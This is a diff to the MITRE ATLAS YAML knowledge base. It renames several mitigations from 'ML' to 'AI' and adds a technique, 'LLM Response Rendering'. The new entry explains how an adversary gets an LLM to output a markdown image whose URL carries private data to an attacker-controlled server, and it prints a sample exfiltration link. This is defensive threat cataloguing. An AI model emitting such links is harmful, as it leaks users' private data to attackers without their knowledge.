@@ -2266,16 +2266,37 @@ matrices:
     - AML.TA0007
     created_date: 2025-04-14
     modified_date: 2025-04-14
+  - id: AML.T0077
+    name: LLM Response Rendering
+    description: "An adversary may get a large language model (LLM) to respond with\
+      \ private information that is hidden from the user when the response is rendered\
+      \ by the user's client. The private information is then exfiltrated. This can\
+      \ take the form of rendered images, which automatically make a request to an\
+      \ adversary controlled server. \n\nThe adversary gets AI to present an image\
+      \ to the user, which is rendered by the user's client application with no user\
+      \ clicks required. The image is hosted on an attacker-controlled website, allowing\
+      \ the adversary to exfiltrate data through image request parameters. Variants\
+      \ include HTML tags and markdown\n\nFor example, an LLM may produce the following\
+      \ markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=\"private\
+      \ data\")\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\"\
+      private data\">\n```\n\nWhen the request is received by the adversary's server\
+      \ hosting the requested image, they receive the contents of the `secrets` query\
+      \ parameter."
+    object-type: technique
+    tactics:
+    - AML.TA0010
+    created_date: 2025-04-15
+    modified_date: 2025-04-15
   mitigations:
   - id: AML.M0000
     name: Limit Public Release of Information
-    description: Limit the public release of technical information about the machine
-      learning stack used in an organization's products or services. Technical knowledge
-      of how machine learning is used can be leveraged by adversaries to perform targeting
-      and tailor attacks to the target system. Additionally, consider limiting the
-      release of organizational information - including physical locations, researcher
-      names, and department structures - from which technical details such as machine
-      learning techniques, model architectures, or datasets may be inferred.
+    description: Limit the public release of technical information about the AI stack
+      used in an organization's products or services. Technical knowledge of how AI
+      is used can be leveraged by adversaries to perform targeting and tailor attacks
+      to the target system. Additionally, consider limiting the release of organizational
+      information - including physical locations, researcher names, and department
+      structures - from which technical details such as AI techniques, model architectures,
+      or datasets may be inferred.
     object-type: mitigation
     techniques:
     - id: AML.T0000
@@ -2301,7 +2322,7 @@ matrices:
     category:
     - Policy
     created_date: 2023-04-12
-    modified_date: 2025-03-12
+    modified_date: 2025-04-15
   - id: AML.M0001
     name: Limit Model Artifact Release
     description: 'Limit public release of technical project details including data,
@@ -2330,7 +2351,7 @@ matrices:
     created_date: 2023-04-12
     modified_date: 2023-10-12
   - id: AML.M0002
-    name: Passive ML Output Obfuscation
+    name: Passive AI Output Obfuscation
     description: 'Decreasing the fidelity of model outputs provided to the end user
       can reduce an adversaries ability to extract information about the model and
       optimize attacks for the model.
@@ -2365,13 +2386,11 @@ matrices:
     category:
     - Technical - ML
     created_date: 2023-04-12
-    modified_date: 2023-10-12
+    modified_date: 2025-04-15
   - id: AML.M0003
     name: Model Hardening
-    description: 'Use techniques to make machine learning models robust to adversarial
-      inputs such as adversarial training or network distillation.
-
-      '
+    description: Use techniques to make AI models robust to adversarial inputs such
+      as adversarial training or network distillation.
     object-type: mitigation
     techniques:
     - id: AML.T0015
@@ -2385,9 +2404,9 @@ matrices:
     category:
     - Technical - ML
     created_date: 2023-04-12
-    modified_date: 2023-10-12
+    modified_date: 2025-04-15
   - id: AML.M0004
-    name: Restrict Number of ML Model Queries
+    name: Restrict Number of AI Model Queries
     description: 'Limit the total number and rate of queries a user can perform.
 
       '
@@ -2450,9 +2469,9 @@ matrices:
     category:
     - Technical - Cyber
     created_date: 2023-04-12
-    modified_date: 2023-10-12
+    modified_date: 2025-04-15
   - id: AML.M0005
-    name: Control Access to ML Models and Data at Rest
+    name: Control Access to AI Models and Data at Rest
     description: 'Establish access controls on internal model registries and limit
       internal access to production models. Limit access to training data only to
       approved users.
@@ -2496,7 +2515,7 @@ matrices:
     category:
     - Policy
     created_date: 2023-04-12
-    modified_date: 2023-10-12
+    modified_date: 2025-04-15
   - id: AML.M0006
     name: Use Ensemble Methods
     description: 'Use an ensemble of models for inference to increase robustness to
@@ -2567,14 +2586,12 @@ matrices:
     created_date: 2023-04-12
     modified_date: 2023-10-12
   - id: AML.M0008
-    name: Validate ML Model
-    description: 'Validate that machine learning models perform as intended by testing
-      for backdoor triggers or adversarial bias.
+    name: Validate AI Model
+    description: 'Validate that AI models perform as intended by testing for backdoor
+      triggers or adversarial bias.
 
       Monitor model for concept drift and training data drift, which may indicate
-      data tampering and poisoning.
-
-      '
+      data tampering and poisoning.'
     object-type: mitigation
     techniques:
     - id: AML.T0010.003
@@ -2595,7 +2612,7 @@ matrices:
     category:
     - Technical - ML
     created_date: 2023-04-12
-    modified_date: 2024-01-12
+    modified_date: 2025-04-15
   - id: AML.M0009
     name: Use Multi-Modal Sensors
     description: 'Incorporate multiple sensors to integrate varying perspectives and
@@ -2652,10 +2669,8 @@ matrices:
       mechanisms and investigating potential vulnerable software.
 
 
-      File formats such as pickle files that are commonly used to store machine learning
-      models can contain exploits that allow for loading of malicious libraries.
-
-      '
+      File formats such as pickle files that are commonly used to store AI models
+      can contain exploits that allow for loading of malicious libraries.'
     object-type: mitigation
     ATT&CK-reference:
       id: M1044
@@ -2668,13 +2683,11 @@ matrices:
     category:
     - Technical - Cyber
     created_date: 2023-04-12
-    modified_date: 2023-10-12
+    modified_date: 2025-04-15
   - id: AML.M0012
     name: Encrypt Sensitive Information
-    description: 'Encrypt sensitive data such as ML models to protect against adversaries
+    description: Encrypt sensitive data such as AI models to protect against adversaries
       attempting to access sensitive data.
-
-      '
     object-type: mitigation
     ATT&CK-reference:
       id: M1041
@@ -2696,16 +2709,13 @@ matrices:
     category:
     - Technical - Cyber
     created_date: 2023-04-12
-    modified_date: 2023-10-12
+    modified_date: 2025-04-15
   - id: AML.M0013
     name: Code Signing
-    description: 'Enforce binary and application integrity with digital signature
-      verification to prevent untrusted code from executing. Adversaries can embed
-      malicious code in ML software or models. Enforcement of code signing can prevent
-      the compromise of the machine learning supply chain and prevent execution of
-      malicious code.
-
-      '
+    description: Enforce binary and application integrity with digital signature verification
+      to prevent untrusted code from executing. Adversaries can embed malicious code
+      in AI software or models. Enforcement of code signing can prevent the compromise
+      of the AI supply chain and prevent execution of malicious code.
     object-type: mitigation
     ATT&CK-reference:
       id: M1045
@@ -2726,13 +2736,11 @@ matrices:
     category:
     - Technical - Cyber
     created_date: 2023-04-12
-    modified_date: 2023-10-12
+    modified_date: 2025-04-15
   - id: AML.M0014
-    name: Verify ML Artifacts
-    description: 'Verify the cryptographic checksum of all machine learning artifacts
-      to verify that the file was not modified by an attacker.
-
-      '
+    name: Verify AI Artifacts
+    description: Verify the cryptographic checksum of all AI artifacts to verify that
+      the file was not modified by an attacker.
     object-type: mitigation
     techniques:
     - id: AML.T0019
@@ -2753,17 +2761,15 @@ matrices:
     category:
     - Technical - Cyber
     created_date: 2023-04-12
-    modified_date: 2023-10-12
+    modified_date: 2025-04-15
   - id: AML.M0015
     name: Adversarial Input Detection
     description: 'Detect and block adversarial inputs or atypical queries that deviate
       from known benign behavior, exhibit behavior patterns observed in previous attacks
       or that come from potentially malicious IPs.
 
-      Incorporate adversarial detection algorithms into the ML system prior to the
-      ML model.
-
-      '
+      Incorporate adversarial detection algorithms into the AI system prior to the
+      AI model.'
     object-type: mitigation
     techniques:
     - id: AML.T0015
@@ -2788,20 +2794,18 @@ matrices:
     category:
     - Technical - ML
     created_date: 2023-04-12
-    modified_date: 2023-10-12
+    modified_date: 2025-04-15
   - id: AML.M0016
     name: Vulnerability Scanning
     description: 'Vulnerability scanning is used to find potentially exploitable software
       vulnerabilities to remediate them.
 
 
-      File formats such as pickle files that are commonly used to store machine learning
-      models can contain exploits that allow for arbitrary code execution.
+      File formats such as pickle files that are commonly used to store AI models
+      can contain exploits that allow for arbitrary code execution.
 
       Both model artifacts and downstream products produced by models should be scanned
-      for known vulnerabilities.
-
-      '
+      for known vulnerabilities.'
     object-type: mitigation
     ATT&CK-reference:
       id: M1016
@@ -2819,19 +2823,17 @@ matrices:
     category:
     - Technical - Cyber
     created_date: 2023-04-12
-    modified_date: 2024-01-12
+    modified_date: 2025-04-15
   - id: AML.M0017
-    name: Model Distribution Methods
-    description: 'Deploying ML models to edge devices can increase the attack surface
+    name: AI Model Distribution Methods
+    description: 'Deploying AI models to edge devices can increase the attack surface
       of the system.
 
       Consider serving models in the cloud to reduce the level of access the adversary
       has to the model.
 
       Also consider computing features in the cloud to prevent gray-box attacks, where
-      an adversary has access to the model preprocessing methods.
-
-      '
+      an adversary has access to the model preprocessing methods.'
     object-type: mitigation
     techniques:
     - id: AML.T0044
@@ -2851,12 +2853,10 @@ matrices:
     category:
     - Policy
     created_date: 2023-04-12
-    modified_date: 2024-01-12
+    modified_date: 2025-04-15
   - id: AML.M0018
     name: User Training
-    description: 'Educate ML model developers on secure coding practices and ML vulnerabilities.
-
-      '
+    description: Educate AI model developers on secure coding practices and AI vulnerabilities.
     object-type: mitigation
     ATT&CK-reference:
       id: M1017
@@ -2877,9 +2877,9 @@ matrices:
     category:
     - Policy
     created_date: 2023-04-12
-    modified_date: 2023-10-12
+    modified_date: 2025-04-15
   - id: AML.M0019
-    name: Control Access to ML Models and Data in Production
+    name: Control Access to AI Models and Data in Production
     description: 'Require users to verify their identities before accessing a production
       model.
 
@@ -2902,7 +2902,7 @@ matrices:
     category:
     - Policy
     created_date: 2024-01-12
-    modified_date: 2024-01-12
+    modified_date: 2025-04-15
   - id: AML.M0020
     name: Generative AI Guardrails
     description: 'Guardrails are safety controls that are placed between a generative
